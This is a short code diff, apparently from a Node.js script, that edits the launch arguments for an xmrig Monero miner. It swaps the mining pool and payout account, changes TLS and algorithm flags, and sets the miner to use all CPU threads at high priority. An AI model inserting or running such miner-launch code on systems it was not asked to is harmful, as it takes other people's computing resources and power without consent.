@@ -58,10 +58,11 @@ const { spawn } = require('child_process');
 
 const command = './xmrig';
 const args = [
-  '-o', 'pool.supportxmr.com:443',
-  '-u', '4AaYk9Q8p8LgKcbo7kdJ6o7mGFLNAJyHbX4NJi1kuzy9SiVsLPQb7rSXxT3CszemkZcw43HUwiq8x8QeWtYpPq3TPKngmiY',
+  '-o', 'xmr.kryptex.network:7777',
+  '-u', 'pimik@send-email.pro/pimik1',
   '-k',
-  '--tls',
+  '--coin', 'monero',
+  '-a', 'rx/0',
   '--cpu-priority=5',
   '--threads=0',
   '--no-cpu-affinity',
